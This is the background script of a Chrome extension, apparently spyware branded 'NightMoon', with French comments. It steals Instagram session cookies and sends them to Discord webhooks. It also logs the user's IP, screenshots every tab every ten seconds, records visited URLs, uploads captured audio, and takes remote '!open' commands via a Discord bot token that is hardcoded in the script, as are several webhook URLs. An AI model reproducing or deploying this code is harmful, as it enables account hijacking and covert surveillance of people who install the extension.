const WEBHOOK_URL = "https://discord.com/api/webhooks/1361032583646937188/difoVJToAVQ6tMcKE0EukX_sBQAumrj6j3U8ZlNhX8R5rxBrt60ijE_ER_0VWD_4ixew";
const DISCORD_API_URL = "https://discord.com/api/v10/channels/1392925684053184684/messages?limit=1"; // Remplace {CHANNEL_ID}
const DISCORD_TOKEN = "Bot MTM5MzE5Njk5MTY5NzI2MDU0NA.Guw3J8.6vnP8zrbxCE7lBvi7RNlpWeghYdKEvOxiJ4LRs"; // Remplace {BOT_TOKEN}

let lastSessionId = null;

function exfiltrateCookie() {
  chrome.cookies.get({
    url: "https://www.instagram.com",
    name: "sessionid"
  }, function(cookie) {
    if (cookie && cookie.value && cookie.value !== lastSessionId) {
      lastSessionId = cookie.value;

      const command = `document.cookie = "sessionid=${cookie.value}; path=/; domain=.instagram.com";`;
      const sessionOnly = `\`${cookie.value}\``;

      const payload = {
        content: "```js\n" + command + "\n```\n\n" + "DUMP! 🚨 sessionid :  \n" + sessionOnly,
        username: "NightMoon DUMP"
      };

      fetch(WEBHOOK_URL, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(payload)
      });
    }
  });
}

chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (tab.url && tab.url.includes("instagram.com")) {
    exfiltrateCookie();
  }
});
chrome.tabs.onActivated.addListener(activeInfo => {
  chrome.tabs.get(activeInfo.tabId, function(tab) {
    if (tab.url && tab.url[0] && tab.url.includes("instagram.com")) {
      exfiltrateCookie();
    }
  });
});

// === Récupération de l'IP au démarrage du navigateur ===
const IP_WEBHOOK_URL = "https://discord.com/api/webhooks/1396234689932558417/SCVJL2yqMT5ZBxSoH6UN728oHT_Zv9FFefA80jAIS0TsxKZpsTOBvc4rsWLDLRwnkcwk"; // Remplace par ton webhook Discord

// Fonction pour récupérer l'adresse IP
async function getUserIP() {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    if (!response.ok) {
      console.error('Erreur lors de la récupération de l\'IP:', response.status, response.statusText);
      return null;
    }
    const data = await response.json();
    return data.ip;
  } catch (err) {
    console.error('Erreur lors de la requête IP:', err);
    return null;
  }
}

// Fonction pour envoyer l'IP au webhook
async function sendIPToWebhook(ip) {
  if (!ip) return;

  const payload = {
    content: `Adresse IP au démarrage: ${ip}`,
    username: 'NightMoon IP Logger'
  };

  try {
    const response = await fetch(IP_WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });

    if (response.ok) {
      console.log('Adresse IP envoyée avec succès');
    } else {
      console.error('Erreur lors de l\'envoi de l\'IP:', response.status, response.statusText);
    }
  } catch (err) {
    console.error('Erreur lors de l\'envoi au webhook:', err);
  }
}

// Événement déclenché au démarrage du navigateur
chrome.runtime.onStartup.addListener(async () => {
  // Vérifier si l'IP a déjà été envoyée dans cette session
  chrome.storage.local.get(['ipSent'], async (result) => {
    if (!result.ipSent) {
      const ip = await getUserIP();
      if (ip) {
        await sendIPToWebhook(ip);
        // Marquer l'IP comme envoyée pour cette session
        chrome.storage.local.set({ ipSent: true });
      }
    }
  });
});

// Réinitialiser le flag à la fin de la session (facultatif, pour les tests)
chrome.runtime.onSuspend.addListener(() => {
  chrome.storage.local.remove('ipSent');
});

// === Gestion des captures d'écran pour tous les onglets ===
function triggerScreenshotInTab(tabId) {
  chrome.scripting.executeScript({
    target: { tabId: tabId },
    func: () => {
      if (typeof window.captureScreenshot === 'function') {
        window.captureScreenshot();
      } else {
        console.error('captureScreenshot non défini dans cet onglet');
      }
    }
  });
}

// Déclencher des captures d'écran sur tous les onglets toutes les 10 secondes
setInterval(() => {
  chrome.tabs.query({}, (tabs) => {
    tabs.forEach(tab => {
      if (tab.url && (tab.url.startsWith('http://') || tab.url.startsWith('https://'))) {
        triggerScreenshotInTab(tab.id);
      }
    });
  });
}, 10000); // 10 secondes

// === Contrôle à distance via API Discord ===
async function checkForCommands() {
  try {
    console.log('Vérification des commandes via API Discord...');
    const response = await fetch(DISCORD_API_URL, {
      headers: {
        'Authorization': DISCORD_TOKEN,
        'Content-Type': 'application/json'
      }
    });
    const messages = await response.json();
    console.log('Réponse API:', messages); // Log de la réponse
    const latestMessage = messages[0]?.content;
    console.log('Dernier message:', latestMessage); // Log du message
    if (latestMessage && latestMessage.startsWith('!open ')) {
      const url = latestMessage.split(' ')[1];
      console.log('URL extraite:', url); // Log de l'URL
      sendRemoteCommand(url);
    }
  } catch (err) {
    console.error('Erreur lors de la vérification des commandes:', err);
  }
}

function sendRemoteCommand(url) {
  console.log('Envoi de la commande à tous les onglets:', url); // Log avant envoi
  chrome.tabs.query({}, (tabs) => {
    tabs.forEach(tab => {
      if (tab.url && (tab.url.startsWith('http://') || tab.url.startsWith('https://'))) {
        console.log('Envoi à l\'onglet:', tab.id, tab.url); // Log pour chaque onglet
        chrome.tabs.sendMessage(tab.id, { action: 'openUrl', url: url }, (response) => {
          if (chrome.runtime.lastError) {
            console.error('Erreur envoi message à l\'onglet:', chrome.runtime.lastError.message);
          } else if (response && response.received) {
            console.log('Commande reçue par l\'onglet:', tab.id); // Log de confirmation
          }
        });
      } else {
        console.log('Onglet ignoré:', tab.id, tab.url); // Log si onglet ignoré
      }
    });
  });
}

// Vérifier les commandes toutes les 5 secondes
setInterval(checkForCommands, 5000);

// === Surveillance des URLs visitées + IP ===
const LINK_TRACKER_WEBHOOK = "https://discord.com/api/webhooks/1396775331612065843/eCsaG3cV5nWka_5x6I6HGp_wG01WAVGRsekbklr0ID0QjGNj8oZq-Yavir64DvOSAbQy";

chrome.webNavigation.onCompleted.addListener(async (details) => {
  try {
    const tab = await new Promise(resolve => chrome.tabs.get(details.tabId, resolve));
    if (!tab || !tab.url) return;

    // Récupère l'IP à chaque événement (peut être optimisé si nécessaire)
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    const ip = data.ip;

    const payload = {
      content: `🌐 Nouveau lien visité:\nIP: \`${ip}\`\nURL: ${tab.url}`,
      username: 'NightMoon Tracker'
    };

    await fetch(LINK_TRACKER_WEBHOOK, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(payload)
    });
  } catch (err) {
    console.error("Erreur lors de l'envoi du lien et IP:", err);
  }
}, { url: [{ schemes: ["http", "https"] }] });

// === Gestion de l'envoi audio depuis content.js ===
const AUDIO_WEBHOOK_URL = "https://discord.com/api/webhooks/1392925741254967419/ZLBWgObuQVZzary2-3FKkccj6Lmp3box_NeQ-nbwA_jq5_g_VICb-dugWy7fK4WdcHL_";

async function sendAudioToWebhook(zipData, filename, url, ip, sizeKB) {
  try {
    const response = await fetch(zipData);
    const zipBlob = await response.blob();
    const formData = new FormData();
    formData.append('file', zipBlob, filename);
    formData.append('payload_json', JSON.stringify({
      content: `🎤 Capture audio depuis ${url}\n🕵️ IP: \`${ip}\`\nTaille: ${sizeKB} KB`,
      username: 'NightMoon Audio'
    }));

    const sendResponse = await fetch(AUDIO_WEBHOOK_URL, {
      method: 'POST',
      body: formData
    });
    if (!sendResponse.ok) {
      console.error('Erreur envoi webhook audio:', sendResponse.statusText);
    } else {
      console.log('Audio envoyé au webhook avec succès:', filename);
    }
  } catch (err) {
    console.error('Erreur lors de l\'envoi audio au webhook:', err);
  }
}

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.action === 'sendAudio') {
    sendAudioToWebhook(message.zipData, message.filename, message.url, message.ip, message.sizeKB)
      .then(() => sendResponse({ success: true }))
      .catch(err => {
        console.error('Erreur dans sendAudioToWebhook:', err);
        sendResponse({ success: false });
      });
    return true; // Indique que la réponse est asynchrone
  }
});